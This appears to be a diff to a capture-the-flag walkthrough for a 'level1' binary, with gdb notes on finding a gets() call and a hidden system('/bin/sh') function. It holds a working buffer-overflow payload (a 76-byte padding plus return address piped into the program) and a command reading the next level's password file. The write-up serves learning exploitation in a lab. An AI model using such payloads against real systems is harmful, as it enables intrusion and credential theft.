@@ -2,9 +2,33 @@
 # Does nothing, let's use gdb again
 
 gdb ./level1
-b main # breakpoint
-run
+
+# Let's check all the function in this program
+info functions
+
+# We can see function run, function main, let's disas
 disas main
-# When we disas we cann see a gets call, let's search for something with that call
+# We can see a gets call, by reading the gets main, we can see there is an exploit which is about buffer overflow
+# https://www.securiteinfo.com/attaques/hacking/buff.shtml, some useful information here
+disas run
+
+# We can see a system call, let's check its argument:
+x/s 0x8048584
+# 0x8048584:	 "/bin/sh"
+# Seems like it's a free using shell
+
+# Let's find the lenght for the overflow
+# After several test, we found it's 76 bytes
+# We need to replace eip adress with run adress at the correct register 
+
+python -c "print('*' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/script
+(cat /tmp/script; cat) | ./level1
+# We use pipe with cat for to access the shell
+
+cat /home/user/level2/.pass
 
 
+# Useful ressources :
+# https://dhavalkapil.com/blogs/Shellcode-Injection/
+# https://docs.python.org/3/library/struct.html
+# https://thinkloveshare.com/hacking/pwn_2of4_ret2libc/
